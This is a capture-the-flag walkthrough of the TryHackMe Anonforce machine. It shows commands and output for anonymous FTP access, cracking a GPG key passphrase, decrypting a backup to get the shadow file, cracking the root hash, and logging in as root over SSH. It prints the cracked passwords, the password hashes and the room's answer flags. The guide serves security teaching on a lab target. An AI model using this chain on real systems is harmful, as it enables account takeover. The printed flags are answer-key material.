# Anonforce — TryHackMe Walkthrough

> A boot2root machine originally created for the FIT and BSides Guatemala CTF. The path to root involves anonymous FTP access, GPG private key cracking, shadow file decryption, and SSH login as root.

<p align="center"><a href="https://tryhackme.com/room/bsidesgtanonforce"><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/eef338293d4a928420f1603870699e75.jpeg" alt="Anonforce" border="0"></a></p>

<p align="center">
  <a href="https://tryhackme.com/room/bsidesgtanonforce"><img src="https://img.shields.io/badge/TryHackMe-Anonforce-red?style=for-the-badge&logo=tryhackme" /></a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Platform-Linux-blue?style=for-the-badge&logo=linux" />
  <img src="https://img.shields.io/badge/Focus-FTP%20Enumeration-orange?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Focus-GPG%20Cracking-orange?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Focus-Hash%20Cracking-orange?style=for-the-badge" />
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration with Nmap |
| 2 | Anonymous FTP Access |
| 3 | FTP File Retrieval |
| 4 | GPG Private Key Cracking with gpg2john and John the Ripper |
| 5 | PGP-Encrypted Backup Decryption |
| 6 | Shadow File Hash Extraction |
| 7 | Root Hash Cracking with John the Ripper |
| 8 | SSH Login as Root |

---

## Learning Objectives

- Identify anonymously accessible FTP services using Nmap and the FTP client
- Navigate and exfiltrate files over an anonymous FTP session
- Convert a GPG private key into a crackable hash format using gpg2john
- Import a decrypted GPG private key and use it to decrypt a PGP-encrypted file
- Extract and crack a SHA-512 root password hash from a decrypted shadow file
- Achieve root-level SSH access using cracked credentials

---

## Prerequisites

- Nmap
- ftp (standard FTP client)
- gpg and gpg2john
- John the Ripper
- rockyou.txt wordlist
---

## [Task 1] — Anonforce Machine

### Step 1 — Network Enumeration

**Approach:** Run an aggressive Nmap scan with service detection, default scripts, and OS fingerprinting to identify open ports and understand the attack surface before touching the machine.

```
kali@kali:~/CTFs/tryhackme/Anonforce$ sudo nmap -A -sS -sC -sV -O Machine_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 16:23 CEST
Nmap scan report for Machine_IP
Host is up (0.038s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Oct 14 07:21 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x  103 0        0               0 Oct 14 07:21 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 Oct 14 07:22 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:YOUR_IP
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 18.52 seconds
```

> **Note:** Two ports are open: FTP on 21 and SSH on 22. The most important finding here is that `ftp-anon` confirms anonymous FTP login is permitted — meaning anyone can connect without a username or password. The directory listing shown in the scan output already reveals what looks like the full root filesystem of the target machine, including a world-writable `notread` directory owned by user 1000. This is the starting point for the entire attack chain.

---

### Step 2 — Anonymous FTP Login and User Flag Retrieval

**Approach:** Connect to the FTP service using the anonymous account, navigate the exposed filesystem to find the user home directory, and download the user flag.

```
kali@kali:~/CTFs/tryhackme/Anonforce$ ftp Machine_IP
Connected to Machine_IP.
220 (vsFTPd 3.0.3)
Name (Machine_IP:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 Oct 14 07:21 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x  101 0        0               0 Oct 14 07:21 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             540 Oct 14 07:22 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 Oct 14 07:21 sys
drwxrwxrwt    9 0        0            4096 Oct 14 07:21 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
226 Directory send OK.
ftp> pwd
257 "/" is the current directory
ftp> cd home
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
226 Directory send OK.
ftp> cd melodias
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for user.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (749.4550 kB/s)

kali@kali:~/CTFs/tryhackme/Anonforce$ cat user.txt
606083fd33beb1284fc51f411a706af8
```

> **Note:** Anonymous FTP login requires no credentials — pressing Enter at the password prompt is sufficient. The FTP root is the target machine's actual filesystem root, so navigating to `/home/melodias` is exactly the same as browsing to a local home directory. The `user.txt` flag belongs to the `melodias` account and is world-readable, so it downloads immediately with `get`.

---

### Step 3 — GPG Private Key Cracking

**Approach:** The `notread` directory found during enumeration contains a GPG private key (`private.asc`) and a PGP-encrypted backup (`backup.pgp`). Download both, then use `gpg2john` to convert the private key into a format John the Ripper can attack, and crack it against the rockyou wordlist.

```
kali@kali:~/CTFs/tryhackme/Anonforce$ gpg2john private.asc > pgp.hash
File private.asc

kali@kali:~/CTFs/tryhackme/Anonforce$ john pgp.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xbox360          (anonforce)
1g 0:00:00:00 DONE (2020-10-14 16:28) 7.692g/s 7153p/s 7153c/s 7153C/s xbox360..sheena
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

> **Note:** `gpg2john` extracts the key-derivation parameters and encrypted key material from the `.asc` file and formats them as a hash that John can process. The cracked passphrase `xbox360` is weak enough to fall within seconds against rockyou. The cost parameters shown — specifically the cipher algorithm value of 9 (AES-256) and hash algorithm 2 (SHA-1) — reflect how the key is protected at rest, but they don't prevent cracking when the passphrase itself is in a common wordlist.

---

### Step 4 — PGP Backup Decryption and Shadow File Extraction

**Approach:** Import the now-unlocked private key into the local GPG keyring and use it to decrypt `backup.pgp`. The decrypted output is the target machine's `/etc/shadow` file.

```
kali@kali:~/CTFs/tryhackme/Anonforce$ gpg --import private.asc
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: key B92CD1F280AD82C2: secret key imported
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
kali@kali:~/CTFs/tryhackme/Anonforce$ gpg --decrypt backup.pgp
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::
```

> **Note:** The backup is an ElGamal-encrypted PGP file — a common asymmetric cipher used in older GPG configurations. Once the matching private key is imported and its passphrase is known, decryption is straightforward. The output is the target's shadow file, which stores hashed passwords for every system account. Accounts showing `*` in the password field have login disabled. The two accounts with real password hashes are `root` (SHA-512, prefixed `$6$`) and `melodias` (MD5, prefixed `$1$`). The root hash is the next target.

---

### Step 5 — Root Hash Cracking

**Approach:** Isolate the root SHA-512 hash from the decrypted shadow output, save it to a file, and run John the Ripper against it using the rockyou wordlist.

```
kali@kali:~/CTFs/tryhackme/Anonforce$ john root.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hikari           (?)
1g 0:00:00:03 DONE (2020-10-14 16:33) 0.3194g/s 2208p/s 2208c/s 2208C/s 98765432..better
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

> **Note:** SHA-512 with 5000 iterations (the default for `crypt(3) $6$`) is significantly stronger than MD5-crypt, but still crackable in seconds when the password is a common word. John identifies the hash type automatically from the `$6$` prefix and applies AVX2 acceleration where available. The cracked password `hikari` is the root account's plaintext password, which will be used directly for SSH login.

---

### Step 6 — Root SSH Login and Flag Retrieval

**Approach:** Use the cracked root credentials to authenticate over SSH and read the root flag from `/root/root.txt`.

```
kali@kali:~/CTFs/tryhackme/Anonforce$ ssh root@Machine_IP
The authenticity of host 'Machine_IP (Machine_IP)' can't be established.
ECDSA key fingerprint is SHA256:5evbK4JjQatGFwpn/RYHt5C3A6banBkqnngz4IVXyz0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'Machine_IP' (ECDSA) to the list of known hosts.
root@Machine_IP's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ubuntu:~# cd /root
root@ubuntu:~# ls
root.txt
root@ubuntu:~# cat root.txt
f706456440c7af4187810c31c6cebdce
```

> **Note:** Root-level SSH access is possible here because the machine permits password authentication for the root account — a configuration that is disabled by default in most hardened systems. Once authenticated as root, there is no privilege escalation required: the flag is readable directly at `/root/root.txt`.

---

### Task 1.1 — What is the user flag?

<details>
<summary>Reveal Answer</summary>

`606083fd33beb1284fc51f411a706af8`

</details>

---

### Task 1.2 — What is the root flag?

<details>
<summary>Reveal Answer</summary>

`f706456440c7af4187810c31c6cebdce`

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan with `-A -sS -sC -sV -O` | Ports 21 (FTP, anonymous login enabled) and 22 (SSH) discovered |
| 2 | Anonymous FTP login; navigated to `/home/melodias`; downloaded `user.txt` | User flag retrieved |
| 3 | Downloaded `private.asc` and `backup.pgp` from the `notread` directory; ran `gpg2john` then John the Ripper against the GPG key | GPG private key passphrase cracked |
| 4 | Imported the private key with `gpg --import`; decrypted `backup.pgp` with `gpg --decrypt` | Shadow file obtained, containing root and melodias password hashes |
| 5 | Isolated root hash to a file; cracked with John the Ripper and rockyou.txt | Root account password cracked |
| 6 | SSH login as root using cracked credentials; read `/root/root.txt` | Root flag retrieved |
